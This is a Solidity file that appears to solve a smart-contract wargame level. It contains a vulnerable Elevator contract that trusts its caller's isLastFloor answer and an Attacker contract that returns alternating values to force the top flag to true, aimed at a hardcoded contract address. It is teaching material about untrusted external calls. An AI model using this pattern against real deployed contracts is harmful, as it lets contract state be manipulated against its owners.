// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
  bool public top;
  uint256 public floor;

  function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Attacker {
  bool public toggle = true;
  Elevator public elevator = Elevator(0x04545087ef5F4d4025D6f017e4AB660821d11d12);

  function isLastFloor(uint256 _floor) public returns (bool) {
    toggle = !toggle;
    return toggle;
  }

  function setTop(uint256 _floor) public {
    elevator.goTo(_floor);
  }
}